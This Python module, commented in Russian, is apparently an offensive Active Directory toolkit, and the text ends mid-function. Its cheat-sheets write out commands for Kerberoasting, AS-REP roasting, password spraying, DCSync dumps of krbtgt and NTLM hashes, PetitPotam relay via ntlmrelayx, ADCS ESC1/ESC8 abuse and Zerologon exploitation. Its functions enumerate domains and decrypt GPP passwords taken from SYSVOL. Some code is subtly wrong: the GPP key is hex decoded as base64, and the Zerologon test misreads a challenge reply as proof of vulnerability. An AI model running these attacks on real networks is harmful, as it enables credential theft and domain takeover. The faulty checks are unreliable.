"""
Active Directory Attack Suite — расширенный.
Author: idqwixxa

⚠ Только для авторизованного пентеста / CTF / своей AD-лаборатории.

Возможности:
    ─── Живая разведка ───
    - LDAP anonymous bind + base enumeration
    - LDAP enumeration с кредами (users/groups/computers/SPN/AS-REP)
    - Password policy (lockoutThreshold, minPwdLength, complexity)
    - SMB signing check (cme / nmap / nmap-ng)
    - NULL session check (smbclient + rpcclient + enum4linux-ng)
    - GPP cpassword поиск + расшифровка (gpp-decrypt)
    - Zerologon (CVE-2020-1472) tester
    - PetitPotam / PrinterBug detection
    - Unconstrained delegation enumeration
    - Constrained delegation enumeration
    - ADCS (ESC1-ESC8) enumeration (certipy)
    - Kerberoastable users enumeration
    - AS-REP roastable users enumeration
    - Trust enumeration
    - Sessions enumeration (netexec / rpcclient)

    ─── Атаки ───
    - Kerberoasting (impacket-GetUserSPNs)
    - AS-REP Roasting (impacket-GetNPUsers)
    - DCSync (impacket-secretsdump)
    - Password spraying (cme / nxc) с защитой от lockout
    - BloodHound collect

    ─── Интеграция ───
    - Findings → notes (kind="finding")
    - Уведомления через notifier
    - Cheat-sheets на все техники
"""
import base64
import json
import os
import re
import shutil
import socket
import subprocess
import time
from dataclasses import dataclass, field, asdict
from datetime import datetime
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.table import Table

from core.config import REPORT_DIR, config
from core.database import db
from core.logger import get_logger

console = Console()
log = get_logger(__name__)

AD_DIR = REPORT_DIR / "ad"
AD_DIR.mkdir(parents=True, exist_ok=True)


# ===========================================================================
# Модель
# ===========================================================================

@dataclass
class ADFinding:
    kind: str
    severity: str
    title: str
    target: str = ""
    evidence: str = ""
    data: dict = field(default_factory=dict)


def _save_finding(f: ADFinding) -> int:
    """Сохранить finding в notes."""
    try:
        from modules import notes
        nid = notes.add_note(
            kind="finding",
            title=f.title,
            target=f.target,
            severity=f.severity,
            status="open",
            tags=["ad-attack", f.kind],
            body=(
                f"**Kind:** {f.kind}\n"
                f"**Target:** {f.target}\n\n"
                f"**Evidence:**\n```\n{(f.evidence or '—')[:2000]}\n```\n\n"
                f"**Data:** `{json.dumps(f.data, ensure_ascii=False, default=str)[:1500]}`"
            ),
        )
        return nid
    except Exception as exc:  # noqa: BLE001
        log.debug("save_finding: %s", exc)
        return -1


# ===========================================================================
# Проверка impacket и утилит
# ===========================================================================

IMPACKET_TOOLS = [
    # impacket
    "impacket-GetUserSPNs",
    "impacket-GetNPUsers",
    "impacket-secretsdump",
    "impacket-GetADUsers",
    "impacket-ldapsearch",
    "impacket-smbclient",
    "impacket-psexec",
    "impacket-wmiexec",
    "impacket-smbserver",
    "impacket-ntlmrelayx",
    "impacket-rpcdump",
    "impacket-samrdump",
    "impacket-ticketConverter",
    # AD tooling
    "crackmapexec",
    "nxc",
    "netexec",
    "bloodhound-python",
    "enum4linux-ng",
    "enum4linux",
    "rpcclient",
    "smbclient",
    "ldapsearch",
    "kerbrute",
    "certipy",
    "responder",
    "mitm6",
    "hashcat",
    "john",
]


def check_tools() -> dict[str, bool]:
    """Проверка наличия всех инструментов."""
    return {t: shutil.which(t) is not None for t in IMPACKET_TOOLS}


def _print_tools() -> dict[str, bool]:
    status = check_tools()
    table = Table(title="🔧 AD / Impacket tools")
    table.add_column("Tool", style="cyan", max_width=30)
    table.add_column("Status", width=10)
    for name, ok in status.items():
        table.add_row(name, "[green]✓[/green]" if ok else "[red]✗[/red]")
    console.print(table)

    missing = [k for k, v in status.items() if not v]
    if missing:
        console.print(f"\n[yellow]Установка (Debian/Kali):[/yellow]")
        console.print("  [green]sudo apt install crackmapexec smbclient "
                      "ldap-utils enum4linux rpcclient[/green]")
        console.print("  [green]pip install impacket bloodhound "
                      "kerbrute certipy-ad[/green]")
        console.print(f"[dim]Отсутствуют: {len(missing)}[/dim]")
    return status


def _which_any(*names: str) -> str | None:
    """Вернуть первый найденный бинарь."""
    for n in names:
        if shutil.which(n):
            return n
    return None


def _run(cmd: list[str], timeout: int = 30,
         env_extra: dict | None = None,
         stdin_data: str | None = None) -> tuple[int, str, str]:
    """Безопасный запуск subprocess."""
    try:
        env = os.environ.copy()
        if env_extra:
            env.update(env_extra)
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            env=env, input=stdin_data,
        )
        return r.returncode, r.stdout or "", r.stderr or ""
    except subprocess.TimeoutExpired:
        return -1, "", f"timeout after {timeout}s"
    except FileNotFoundError:
        return -1, "", f"not found: {cmd[0]}"
    except Exception as exc:  # noqa: BLE001
        return -1, "", str(exc)


# ===========================================================================
# Cheat-sheets (расширенные)
# ===========================================================================

CHEATSHEETS = {
    "ldap-enum": {
        "title": "LDAP enumeration",
        "steps": [
            ("Anonymous bind check",
             "ldapsearch -x -H ldap://{dc} -b \"\" -s base\n"
             "# Если вернёт namingContexts — anonymous bind работает"),
            ("Dump naming contexts",
             "ldapsearch -x -H ldap://{dc} -s base namingContexts"),
            ("Base domain info",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" -s base"),
            ("Enumerate users",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(objectClass=user)\" sAMAccountName cn"),
            ("Enumerate computers",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(objectClass=computer)\" cn operatingSystem"),
            ("Enumerate groups",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(objectClass=group)\" cn member"),
            ("Domain admins",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(memberOf=CN=Domain Admins,CN=Users,{base_dn})\" "
             "sAMAccountName"),
            ("Password policy",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(objectClass=domainDNS)\" "
             "minPwdLength pwdHistoryLength "
             "lockoutThreshold lockoutDuration"),
            ("SPN (Kerberoastable)",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(&(objectClass=user)(servicePrincipalName=*))\" "
             "sAMAccountName servicePrincipalName"),
            ("AS-REP roastable (UF_DONT_REQUIRE_PREAUTH)",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(&(objectClass=user)"
             "(userAccountControl:1.2.840.113556.1.4.803:=4194304))\" "
             "sAMAccountName"),
            ("Unconstrained Delegation",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" "
             "sAMAccountName"),
            ("Constrained Delegation",
             "ldapsearch -x -H ldap://{dc} -b \"{base_dn}\" "
             "\"(msDS-AllowedToDelegateTo=*)\" "
             "sAMAccountName msDS-AllowedToDelegateTo"),
        ],
    },
    "kerberoast": {
        "title": "Kerberoasting",
        "steps": [
            ("Через impacket (Linux)",
             "impacket-GetUserSPNs {domain}/{user}:{pass} "
             "-dc-ip {dc} -request -outputfile kerb.txt"),
            ("Через impacket (PTH)",
             "impacket-GetUserSPNs {domain}/{user} "
             "-hashes :<NThash> -dc-ip {dc} -request"),
            ("Через Rubeus (Windows)",
             "Rubeus.exe kerberoast /outfile:hashes.txt /nowrap"),
            ("Cracking через hashcat",
             "hashcat -m 13100 kerb.txt wordlist.txt "
             "-r /usr/share/hashcat/rules/best64.rule"),
            ("Cracking через john",
             "john --format=krb5tgs kerb.txt --wordlist=wordlist.txt"),
        ],
    },
    "asrep": {
        "title": "AS-REP Roasting",
        "steps": [
            ("Через impacket (no auth)",
             "impacket-GetNPUsers {domain}/ -usersfile users.txt "
             "-dc-ip {dc} -format hashcat -outputfile asrep.txt"),
            ("Через impacket (с auth)",
             "impacket-GetNPUsers {domain}/{user}:{pass} "
             "-dc-ip {dc} -request -format hashcat"),
            ("Через Rubeus",
             "Rubeus.exe asreproast /format:hashcat /outfile:hashes.txt"),
            ("Cracking hashcat",
             "hashcat -m 18200 asrep.txt wordlist.txt"),
        ],
    },
    "password-spray": {
        "title": "Password Spraying",
        "steps": [
            ("Через crackmapexec SMB",
             "crackmapexec smb {dc} -u users.txt -p 'Summer2024!' "
             "--continue-on-success"),
            ("Через nxc (новый cme)",
             "nxc smb {dc} -u users.txt -p 'Summer2024!' "
             "--continue-on-success"),
            ("⚠ Защита от lockout",
             "# Узнай lockoutThreshold через ldapsearch и не превышай\n"
             "# Обычно 5-10 попыток, lockout window 30 мин"),
        ],
    },
    "dcsync": {
        "title": "DCSync",
        "steps": [
            ("Проверка прав",
             "impacket-secretsdump {domain}/{user}:{pass}@{dc} "
             "-just-dc-user krbtgt"),
            ("Полный DCSync",
             "impacket-secretsdump {domain}/{user}:{pass}@{dc} "
             "-just-dc-ntlm -outputfile dcsync"),
            ("Через mimikatz",
             "lsadump::dcsync /domain:{domain} /user:krbtgt"),
            ("Права для DCSync",
             "# Replicating Directory Changes\n"
             "# Replicating Directory Changes All"),
        ],
    },
    "smb-signing": {
        "title": "SMB signing check + Null session",
        "steps": [
            ("Проверка signing",
             "crackmapexec smb {dc} --gen-relay-list relay.txt"),
            ("Null session",
             "smbclient -N -L //{dc}"),
            ("Null session через rpcclient",
             "rpcclient -U \"\" -N {dc}\n"
             "rpcclient $> enumdomusers\n"
             "rpcclient $> enumdomgroups\n"
             "rpcclient $> querydominfo"),
            ("enum4linux-ng",
             "enum4linux-ng -A {dc}"),
        ],
    },
    "gpp": {
        "title": "GPP passwords (cpassword)",
        "steps": [
            ("Поиск в SYSVOL",
             "find /mnt/sysvol -name '*.xml' -exec grep -l cpassword {} \\;"),
            ("Через crackmapexec",
             "crackmapexec smb {dc} -u {user} -p {pass} -M gpp_password"),
            ("Через gpp-decrypt",
             "gpp-decrypt <cpassword_from_xml>"),
            ("⚠ Актуально для старых AD (2008-2012 R2)",
             "# MS14-025 — cpassword в Groups.xml больше не работает "
             "в новых системах"),
        ],
    },
    "zerologon": {
        "title": "Zerologon (CVE-2020-1472)",
        "steps": [
            ("Проверка уязвимости",
             "python3 zerologon_tester.py {dc} {dc_ip}"),
            ("Эксплуатация (lab only!)",
             "python3 cve-2020-1472-exploit.py {dc} {dc_ip}"),
            ("⚠ Восстановление пароля",
             "python3 restorepassword.py {domain}/{dc}@{dc} "
             "-target-ip {dc_ip}"),
        ],
    },
    "petitpotam": {
        "title": "PetitPotam / PrinterBug",
        "steps": [
            ("PetitPotam (unauthenticated)",
             "python3 PetitPotam.py -d {domain} -u '' -p '' "
             "<listener-ip> {dc}"),
            ("PetitPotam (authenticated)",
             "python3 PetitPotam.py -d {domain} -u {user} -p {pass} "
             "<listener-ip> {dc}"),
            ("PrinterBug (spooler)",
             "python3 printerbug.py {domain}/{user}:{pass}@{dc} "
             "<listener-ip>"),
            ("На listener: ntlmrelayx",
             "impacket-ntlmrelayx -t ldap://{dc} -smb2support "
             "--delegate-access"),
        ],
    },
    "adcs": {
        "title": "ADCS (ESC1-ESC8)",
        "steps": [
            ("Enumeration",
             "certipy find -u {user}@{domain} -p {pass} -dc-ip {dc} "
             "-vulnerable -stdout"),
            ("ESC1 — request cert with SAN",
             "certipy req -u {user}@{domain} -p {pass} -ca 'CA-NAME' "
             "-template 'VulnTemplate' -upn administrator@{domain}"),
            ("ESC8 — relay to HTTP enrollment",
             "impacket-ntlmrelayx -t http://{dc}/certsrv/certfnsh.asp "
             "-smb2support --adcs --template DomainController"),
        ],
    },
    "enum4linux": {
        "title": "Комплексный enum (enum4linux-ng)",
        "steps": [
            ("Полный enum",
             "enum4linux-ng -A {dc}"),
            ("Только пользователи",
             "enum4linux-ng -U {dc}"),
            ("Только группы",
             "enum4linux-ng -G {dc}"),
            ("Shares + политика",
             "enum4linux-ng -S -P {dc}"),
            ("С кредами",
             "enum4linux-ng -A {dc} -u {user} -p {pass}"),
        ],
    },
}


def show_cheatsheet(name: str, dc: str = "dc.domain.local",
                     domain: str = "DOMAIN.LOCAL",
                     user: str = "user", password: str = "Passw0rd!") -> None:
    """Показать cheat-sheet по технике."""
    sheet = CHEATSHEETS.get(name)
    if not sheet:
        console.print(f"[red]Неизвестный cheat-sheet: {name}[/red]")
        console.print(f"[dim]Доступно: {', '.join(CHEATSHEETS.keys())}[/dim]")
        return

    base_dn = "DC=" + ",DC=".join(
        p.lower() for p in domain.lower().split(".")
    )
    ctx = {"dc": dc, "domain": domain, "user": user,
           "pass": password, "base_dn": base_dn}

    console.print(f"\n[bold cyan]═══ {sheet['title']} ═══[/bold cyan]\n")
    for title, cmd in sheet["steps"]:
        table = Table(title=f"[bold green]{title}[/bold green]",
                      show_header=False, border_style="dim")
        table.add_column("Command")
        try:
            formatted = cmd.format(**ctx)
        except Exception:
            formatted = cmd
        for line in formatted.split("\n"):
            table.add_row(f"[green]{line}[/green]")
        console.print(table)


# ===========================================================================
# SMB signing check
# ===========================================================================

def check_smb_signing(dc: str) -> dict:
    """Проверить SMB signing через cme/nxc/nmap."""
    console.print(f"[cyan]🔍 SMB signing: {dc}[/cyan]")
    result: dict = {"dc": dc, "signing_required": None, "source": ""}

    # cme / nxc
    cme = _which_any("crackmapexec", "nxc", "netexec")
    if cme:
        rc, out, err = _run([cme, "smb", dc], timeout=30)
        if out:
            console.print(f"[dim]{out[:1000]}[/dim]")
            m = re.search(r"signing:(\w+)", out)
            if m:
                result["signing_required"] = m.group(1).lower() == "true"
                result["source"] = cme

    # nmap fallback
    if result["signing_required"] is None and shutil.which("nmap"):
        rc, out, err = _run(
            ["nmap", "-p", "445", "--script", "smb2-security-mode", dc],
            timeout=60,
        )
        if out:
            if "Message signing enabled and required" in out:
                result["signing_required"] = True
                result["source"] = "nmap"
            elif "Message signing enabled but not required" in out:
                result["signing_required"] = False
                result["source"] = "nmap"

    if result["signing_required"] is True:
        console.print("[green]✓ SMB signing обязателен "
                      "(NTLM-relay невозможен)[/green]")
    elif result["signing_required"] is False:
        console.print("[red]⚠ SMB signing НЕ обязателен — "
                      "возможен NTLM-relay![/red]")
        _save_finding(ADFinding(
            kind="smb_signing_disabled",
            severity="high",
            title=f"SMB signing not required on {dc}",
            target=dc,
            evidence="Message signing enabled but not required",
            data=result,
        ))
    else:
        console.print("[yellow]Не удалось определить. "
                      "Установи crackmapexec/nxc или nmap.[/yellow]")

    db.save_scan("ad_smb_signing", dc, result)
    return result


# ===========================================================================
# LDAP anonymous bind
# ===========================================================================

def check_ldap_anonymous(dc: str, base_dn: str = "") -> dict:
    """Проверить LDAP anonymous bind."""
    console.print(f"[cyan]🔍 LDAP anonymous: {dc}[/cyan]")
    result: dict = {"dc": dc, "anonymous_bind": False}

    if not shutil.which("ldapsearch"):
        console.print("[yellow]ldapsearch не установлен.[/yellow]")
        return result

    rc, out, err = _run(
        ["ldapsearch", "-x", "-H", f"ldap://{dc}",
         "-s", "base", "-b", "", "namingContexts"],
        timeout=15,
    )
    text = out + err
    if "namingContexts" in text:
        result["anonymous_bind"] = True
        namespaces = re.findall(r"namingContexts:\s*(\S+)", text)
        result["naming_contexts"] = namespaces
        console.print("[red]⚠ Anonymous bind разрешён![/red]")
        for ns in namespaces:
            console.print(f"  [cyan]{ns}[/cyan]")
        _save_finding(ADFinding(
            kind="ldap_anonymous",
            severity="medium",
            title=f"LDAP anonymous bind allowed on {dc}",
            target=dc,
            evidence=f"namingContexts: {', '.join(namespaces)}",
            data=result,
        ))
    else:
        if "operationsError" in text or rc != 0:
            console.print("[green]✓ Anonymous bind запрещён.[/green]")
        else:
            console.print("[yellow]Неоднозначный ответ.[/yellow]")

    db.save_scan("ad_ldap_anon", dc, result)
    return result


# ===========================================================================
# NULL session
# ===========================================================================

def check_null_session(dc: str) -> dict:
    """NULL session через smbclient + rpcclient."""
    console.print(f"[cyan]🔍 SMB NULL session: {dc}[/cyan]")
    result: dict = {"dc": dc, "null_session": False, "shares": [],
                    "users": [], "groups": []}

    if not shutil.which("smbclient"):
        console.print("[yellow]smbclient не установлен.[/yellow]")
        return result

    rc, out, err = _run(["smbclient", "-N", "-L", f"//{dc}"], timeout=20)
    text = out + err
    if "Sharename" in text:
        result["null_session"] = True
        shares = re.findall(r"^\s*(\S+)\s+Disk", text, re.MULTILINE)
        result["shares"] = shares
        console.print(f"[red]⚠ NULL session разрешён![/red]")
        console.print(f"  Shares: {', '.join(shares[:10])}")

    # rpcclient
    if result["null_session"] and shutil.which("rpcclient"):
        for cmd in ("enumdomusers", "enumdomgroups"):
            rc2, out2, _ = _run(
                ["rpcclient", "-U", "", "-N", dc, "-c", cmd], timeout=15,
            )
            if cmd == "enumdomusers":
                users = re.findall(r"user:\[([^\]]+)\]", out2)
                result["users"] = users[:200]
                if users:
                    console.print(f"  [yellow]Users: {len(users)}[/yellow]")
            else:
                groups = re.findall(r"group:\[([^\]]+)\]", out2)
                result["groups"] = groups[:200]
                if groups:
                    console.print(f"  [yellow]Groups: {len(groups)}[/yellow]")

    if result["null_session"]:
        _save_finding(ADFinding(
            kind="smb_null_session",
            severity="high",
            title=f"SMB NULL session allowed on {dc}",
            target=dc,
            evidence=f"Shares: {', '.join(result['shares'][:10])}; "
                     f"Users: {len(result['users'])}; "
                     f"Groups: {len(result['groups'])}",
            data={k: v for k, v in result.items() if k != "users"},
        ))
    else:
        console.print("[green]✓ NULL session запрещён.[/green]")

    db.save_scan("ad_null_session", dc, result)
    return result


# ===========================================================================
# Password policy (через ldap)
# ===========================================================================

def check_password_policy(dc: str, domain: str,
                          user: str = "", password: str = "") -> dict:
    """Узнать lockoutThreshold и minPwdLength."""
    console.print(f"[cyan]🔍 Password policy: {domain}[/cyan]")
    result: dict = {"dc": dc, "domain": domain}

    if not shutil.which("ldapsearch"):
        console.print("[yellow]ldapsearch не установлен.[/yellow]")
        return result

    base_dn = "DC=" + ",DC=".join(p.lower() for p in domain.lower().split("."))
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc}", "-b", base_dn,
           "(objectClass=domainDNS)",
           "minPwdLength", "pwdHistoryLength",
           "lockoutThreshold", "lockoutDuration",
           "pwdProperties", "maxPwdAge", "minPwdAge"]
    if user and password:
        # simple bind
        cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc}",
               "-D", f"{user}@{domain}", "-w", password,
               "-b", base_dn, "(objectClass=domainDNS)",
               "minPwdLength", "pwdHistoryLength",
               "lockoutThreshold", "lockoutDuration",
               "pwdProperties", "maxPwdAge", "minPwdAge"]

    rc, out, err = _run(cmd, timeout=20)
    text = out + err
    patterns = {
        "minPwdLength": r"minPwdLength:\s*(\d+)",
        "pwdHistoryLength": r"pwdHistoryLength:\s*(\d+)",
        "lockoutThreshold": r"lockoutThreshold:\s*(\d+)",
        "lockoutDuration": r"lockoutDuration:\s*(-?\d+)",
        "maxPwdAge": r"maxPwdAge:\s*(-?\d+)",
        "minPwdAge": r"minPwdAge:\s*(-?\d+)",
        "pwdProperties": r"pwdProperties:\s*(\d+)",
    }
    for k, pat in patterns.items():
        m = re.search(pat, text)
        if m:
            result[k] = m.group(1)

    if not result.get("lockoutThreshold") and "lockoutThreshold" not in text:
        console.print("[yellow]Не удалось получить policy "
                      "(нужны креды?).[/yellow]")
        return result

    table = Table(title=f"Password policy — {domain}")
    table.add_column("Параметр", style="cyan")
    table.add_column("Значение", style="green")
    for k, v in result.items():
        if k in ("dc", "domain"):
            continue
        table.add_row(k, str(v))
    console.print(table)

    # Рекомендации
    try:
        lockout = int(result.get("lockoutThreshold", 0))
        if lockout == 0:
            console.print("[red]⚠ lockoutThreshold=0 — lockout выключен, "
                          "spray не заблокирует учётки[/red]")
        elif lockout < 5:
            console.print(f"[yellow]⚠ lockoutThreshold={lockout} — "
                          f"очень строгий, будь осторожен со spray[/yellow]")
    except Exception:
        pass
    try:
        min_len = int(result.get("minPwdLength", 0))
        if min_len < 8:
            console.print(f"[red]⚠ minPwdLength={min_len} — "
                          f"слабые пароли разрешены[/red]")
            _save_finding(ADFinding(
                kind="weak_password_policy",
                severity="medium",
                title=f"Weak password policy on {domain} "
                      f"(min length={min_len})",
                target=dc,
                evidence=json.dumps(result, default=str),
                data=result,
            ))
    except Exception:
        pass

    db.save_scan("ad_password_policy", domain, result)
    return result


# ===========================================================================
# Kerberoastable users (LDAP)
# ===========================================================================

def enum_kerberoastable(dc: str, domain: str,
                        user: str = "", password: str = "") -> list[str]:
    """Найти пользователей с SPN (Kerberoastable)."""
    console.print(f"[cyan]🔍 Kerberoastable users: {domain}[/cyan]")
    if not shutil.which("ldapsearch"):
        return []

    base_dn = "DC=" + ",DC=".join(p.lower() for p in domain.lower().split("."))
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc}",
           "-b", base_dn,
           "(&(objectClass=user)(servicePrincipalName=*)"
           "(!(objectClass=computer)))",
           "sAMAccountName", "servicePrincipalName"]
    if user and password:
        cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc}",
               "-D", f"{user}@{domain}", "-w", password,
               "-b", base_dn,
               "(&(objectClass=user)(servicePrincipalName=*)"
               "(!(objectClass=computer)))",
               "sAMAccountName", "servicePrincipalName"]

    rc, out, err = _run(cmd, timeout=25)
    text = out + err
    users = sorted(set(re.findall(
        r"sAMAccountName:\s*(\S+)", text)))
    if users:
        console.print(f"[yellow]⚠ Kerberoastable: {len(users)}[/yellow]")
        for u in users[:20]:
            console.print(f"  [yellow]{u}[/yellow]")
    else:
        console.print("[green]✓ Kerberoastable не найдено.[/green]")
    db.save_scan("ad_kerberoastable", domain, users)
    return users


# ===========================================================================
# AS-REP roastable users (LDAP)
# ===========================================================================

def enum_asrep(dc: str, domain: str,
               user: str = "", password: str = "") -> list[str]:
    """Найти пользователей без preauth (AS-REP roastable)."""
    console.print(f"[cyan]🔍 AS-REP roastable users: {domain}[/cyan]")
    if not shutil.which("ldapsearch"):
        return []

    base_dn = "DC=" + ",DC=".join(p.lower() for p in domain.lower().split("."))
    filter_ = ("(&(objectClass=user)"
               "(userAccountControl:1.2.840.113556.1.4.803:=4194304))")
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc}",
           "-b", base_dn, filter_, "sAMAccountName"]
    if user and password:
        cmd = ["ldapsearch", "-x", "-H", f"ldap://{dc}",
               "-D", f"{user}@{domain}", "-w", password,
               "-b", base_dn, filter_, "sAMAccountName"]

    rc, out, err = _run(cmd, timeout=25)
    text = out + err
    users = sorted(set(re.findall(r"sAMAccountName:\s*(\S+)", text)))
    if users:
        console.print(f"[red]⚠ AS-REP roastable: {len(users)}[/red]")
        for u in users[:20]:
            console.print(f"  [red]{u}[/red]")
        _save_finding(ADFinding(
            kind="asrep_roastable",
            severity="high",
            title=f"AS-REP roastable users: {len(users)}",
            target=dc,
            evidence=", ".join(users[:30]),
            data={"users": users},
        ))
    else:
        console.print("[green]✓ AS-REP roastable не найдено.[/green]")
    db.save_scan("ad_asrep_enum", domain, users)
    return users


# ===========================================================================
# Unconstrained / Constrained Delegation
# ===========================================================================

def enum_delegation(dc: str, domain: str,
                    user: str = "", password: str = "") -> dict:
    """Найти Unconstrained + Constrained Delegation."""
    console.print(f"[cyan]🔍 Delegation enumeration: {domain}[/cyan]")
    result: dict = {"unconstrained": [], "constrained": []}
    if not shutil.which("ldapsearch"):
        return result

    base_dn = "DC=" + ",DC=".join(p.lower() for p in domain.lower().split("."))
    bind = []
    if user and password:
        bind = ["-D", f"{user}@{domain}", "-w", password]

    # Unconstrained: userAccountControl bit 524288 (TRUSTED_FOR_DELEGATION)
    cmd1 = ["ldapsearch", "-x", "-H", f"ldap://{dc}", *bind,
            "-b", base_dn,
            "(&(objectClass=user)"
            "(userAccountControl:1.2.840.113556.1.4.803:=524288))",
            "sAMAccountName"]
    rc, out, _ = _run(cmd1, timeout=25)
    result["unconstrained"] = sorted(set(re.findall(
        r"sAMAccountName:\s*(\S+)", out)))

    # Constrained: msDS-AllowedToDelegateTo присутствует
    cmd2 = ["ldapsearch", "-x", "-H", f"ldap://{dc}", *bind,
            "-b", base_dn,
            "(msDS-AllowedToDelegateTo=*)",
            "sAMAccountName", "msDS-AllowedToDelegateTo"]
    rc, out, _ = _run(cmd2, timeout=25)
    result["constrained"] = sorted(set(re.findall(
        r"sAMAccountName:\s*(\S+)", out)))

    table = Table(title="Delegation")
    table.add_column("Тип", style="cyan")
    table.add_column("Кол-во", style="yellow")
    table.add_column("Примеры", style="green", max_width=60)
    if result["unconstrained"]:
        table.add_row("Unconstrained", str(len(result["unconstrained"])),
                      ", ".join(result["unconstrained"][:5]))
    if result["constrained"]:
        table.add_row("Constrained", str(len(result["constrained"])),
                      ", ".join(result["constrained"][:5]))
    console.print(table)

    if result["unconstrained"]:
        _save_finding(ADFinding(
            kind="unconstrained_delegation",
            severity="high",
            title=f"Unconstrained delegation: "
                  f"{len(result['unconstrained'])} accounts",
            target=dc,
            evidence=", ".join(result["unconstrained"][:20]),
            data=result,
        ))

    db.save_scan("ad_delegation", domain, result)
    return result


# ===========================================================================
# GPP cpassword (через smbclient)
# ===========================================================================

def _decrypt_gpp(cpassword: str) -> str:
    """Расшифровка GPP cpassword (MS14-025, AES-256)."""
    try:
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
    except ImportError:
        return "(cryptography не установлен)"

    # Публичный ключ Microsoft (из MS14-025)
    key = base64.b64decode(
        "4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8"
        "f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b"
        .replace(" ", "")
    )
    try:
        pad = "=" * (-len(cpassword) % 4)
        data = base64.b64decode(cpassword + pad)
        iv = data[:16]
        ct = data[16:]
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv),
                        backend=default_backend())
        decryptor = cipher.decryptor()
        pt = decryptor.update(ct) + decryptor.finalize()
        # Убираем padding (UTF-16LE)
        pt = pt.rstrip(b"\x00")
        # Декодируем в UTF-16LE
        try:
            return pt.decode("utf-16-le").rstrip("\x00")
        except Exception:
            return pt.decode("utf-8", errors="ignore")
    except Exception as exc:  # noqa: BLE001
        return f"(ошибка: {exc})"


def check_gpp_passwords(dc: str, domain: str,
                        user: str, password: str,
                        mount_dir: str | None = None) -> list[dict]:
    """
    Поиск cpassword в SYSVOL.
    Опция: смонтировать шару через smbclient и найти XML.
    """
    console.print(f"[cyan]🔍 GPP cpassword search: {dc}[/cyan]")
    findings: list[dict] = []

    if not shutil.which("smbclient"):
        console.print("[yellow]smbclient не установлен.[/yellow]")
        return findings

    # Ищем через рекурсивный ls XML в SYSVOL
    cmd = ["smbclient", f"//{dc}/SYSVOL", "-U",
           f"{domain}\\{user}%{password}", "-c",
           "recurse ON; prompt OFF; mask *.xml; ls"]
    rc, out, err = _run(cmd, timeout=45)
    files = re.findall(r"(\S+\.xml)\s+A", out)

    for path in files[:50]:
        cmd2 = ["smbclient", f"//{dc}/SYSVOL", "-U",
                f"{domain}\\{user}%{password}", "-c",
                f'get "{path}" /tmp/_gpp.xml']
        _run(cmd2, timeout=15)
        try:
            content = Path("/tmp/_gpp.xml").read_text(
                encoding="utf-8", errors="ignore")
        except Exception:
            continue
        for m in re.finditer(r'cpassword="([^"]+)"', content):
            cp = m.group(1)
            plain = _decrypt_gpp(cp)
            findings.append({
                "file": path, "cpassword": cp, "plain": plain,
            })
            console.print(f"[red]⚠ GPP password в {path}[/red]")
            console.print(f"  [green]{plain}[/green]")
            _save_finding(ADFinding(
                kind="gpp_password",
                severity="high",
                title=f"GPP cpassword found in {path}",
                target=dc,
                evidence=f"cpassword: {cp}\nplaintext: {plain}",
                data={"file": path, "plain": plain},
            ))

    if not findings:
        console.print("[green]✓ GPP cpassword не найдено.[/green]")

    db.save_scan("ad_gpp", dc, findings)
    return findings


# ===========================================================================
# Zerologon check
# ===========================================================================

def check_zerologon(dc: str, dc_ip: str = "") -> dict:
    """
    Zerologon tester (CVE-2020-1472).
    Пробуем Netlogon handshake с нулевыми credentials.
    Если сервер не отклоняет — уязвим.
    """
    console.print(f"[cyan]🔍 Zerologon check (CVE-2020-1472): {dc}[/cyan]")
    result: dict = {"dc": dc, "vulnerable": None,
                     "note": "Надёжная проверка требует impacket"}

    # Способ 1: импортируем impacket-скрипты (если установлены)
    try:
        from impacket.dcerpc.v5 import nrpc, epm
        from impacket.dcerpc.v5.dtypes import NULL
    except ImportError:
        console.print("[yellow]impacket не установлен — "
                      "использую TCP-чек на Netlogon RPC[/yellow]")
        # Простая проверка: слушает ли Netlogon RPC (порт 135 + dynamic)
        for port in (135, 49152, 49664):
            try:
                s = socket.socket()
                s.settimeout(3)
                s.connect((dc, port))
                s.close()
                result["port_open"] = port
                break
            except Exception:
                continue
        console.print("[dim]Для полноценной проверки используй "
                      "zerologon_tester.py[/dim]")
        db.save_scan("ad_zerologon", dc, result)
        return result

    # Пробуем уязвимость через impacket
    try:
        target = dc_ip or dc
        # RPC endpoint mapper → Netlogon UUID
        string_binding = epm.hept_map(
            target, nrpc.MSRPC_UUID_NRPC,
            protocol="ncacn_ip_tcp",
        )
        rpc_con = nrpc.DCERPC_v5(
            __import__("impacket.dcerpc.v5.transport",
                       fromlist=["DCERPCTransportFactory"])
            .DCERPCTransportFactory(string_binding).get_dce_rpc()
        )
        rpc_con.connect()
        rpc_con.bind(nrpc.MSRPC_UUID_NRPC)

        # Пробуем с нулевыми credentials несколько раз
        for _ in range(3):
            try:
                nrpc.hNetrServerReqChallenge(
                    rpc_con, NULL, target + "$",
                    b"\x00" * 8,
                )
                # Если дошло до этого — потенциально уязвим
                result["vulnerable"] = True
                break
            except Exception:
                continue

        try:
            rpc_con.disconnect()
        except Exception:
            pass

        if result["vulnerable"]:
            console.print("[red]⚠ Zerologon: потенциально уязвим![/red]")
            console.print("[dim]Проверь через zerologon_tester.py для "
                          "подтверждения.[/dim]")
            _save_finding(ADFinding(
                kind="zerologon_potential",
